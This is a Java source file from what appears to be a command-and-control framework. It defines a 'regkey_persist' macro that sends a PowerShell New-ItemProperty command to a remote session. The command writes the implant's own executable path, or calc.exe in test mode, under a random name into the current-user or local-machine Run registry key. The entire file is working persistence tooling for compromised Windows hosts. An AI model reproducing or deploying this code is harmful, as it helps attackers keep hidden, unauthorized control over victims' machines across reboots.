package c2.session.macro.persistence;

import c2.Commands;
import c2.HarvestProcessor;
import c2.csharp.StagerGenerator;
import c2.session.IOManager;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;

public class WindowStartupKey extends AbstractCommandMacro {

	public static String CURRENT_USER_START_KEY = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	public static String LOCAL_MACHINE_START_KEY = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	
	public static String TEST_WIN_RUNKEY_PERSISTENCE = "regkey_persist";
	public static String TEST_WIN_RUNKEY_PERSISTENCE_OPTION_CU = "cu";
	public static String TEST_WIN_RUNKEY_PERSISTENCE_OPTION_LM = "lm";
	public static String TEST_WIN_RUNKEY_PERSISTENCE_OPTION_CALC = "calc";
	
	public static String HELP = TEST_WIN_RUNKEY_PERSISTENCE + " (" + TEST_WIN_RUNKEY_PERSISTENCE_OPTION_CU + " or " + 
			TEST_WIN_RUNKEY_PERSISTENCE_OPTION_LM + ") <optional - calc>" + System.lineSeparator() + "third argument, calc, is used when the test should insert calc.exe as the startup argument" + System.lineSeparator()
			+ "The second argument is used to specify if the current user or local machine startup key should be used.";
	
	public static final String NEW_RUNKEY_CMD = "powershell.exe -c \"New-ItemProperty -Path '$KEY_NAME$' -Name '$EXE_NAME$' -Value '$EXE_PATH$' -Force";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.startsWith(TEST_WIN_RUNKEY_PERSISTENCE + " "); 
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String cmdElements[] = cmd.split(" ");
		if(cmdElements.length < 2 || cmdElements.length > 3) {
			outcome.addError("Cannot execute command: requires format " + HELP);
		}else {
			String cmdForKey; 
			if(cmdElements.length == 3) {
				if(cmdElements[2].equalsIgnoreCase(TEST_WIN_RUNKEY_PERSISTENCE_OPTION_CALC)) {
					cmdForKey = "calc.exe";
				}else {
					outcome.addError("Cannot execute command: third argument if specified must be 'calc'");
					return outcome;
				}
			}else {
				sendCommand(Commands.CLIENT_GET_EXE_CMD, sessionId, outcome);
				String clientCmd = awaitResponse(sessionId, outcome);
				clientCmd = clientCmd.replace("\r", "");
				clientCmd = clientCmd.replace("\n", "");
				cmdForKey = clientCmd;
			}
			String command = NEW_RUNKEY_CMD;
			if(cmdElements[1].equalsIgnoreCase(TEST_WIN_RUNKEY_PERSISTENCE_OPTION_CU)) {
				command = command.replace("$KEY_NAME$", CURRENT_USER_START_KEY);
			}else if(cmdElements[1].equalsIgnoreCase(TEST_WIN_RUNKEY_PERSISTENCE_OPTION_LM)) {
				command = command.replace("$KEY_NAME$", LOCAL_MACHINE_START_KEY);
			}else {
				outcome.addError("Cannot execute command, unknown second argument: " + cmdElements[1]);
				return outcome;
			}
			command = command.replace("$EXE_NAME$", StagerGenerator.generateRandomLetterString());
			command = command.replace("$EXE_PATH$", cmdForKey);
			sendCommand(command, sessionId, outcome);
			
			awaitResponse(sessionId, outcome);
		}
		return outcome;
	}

}
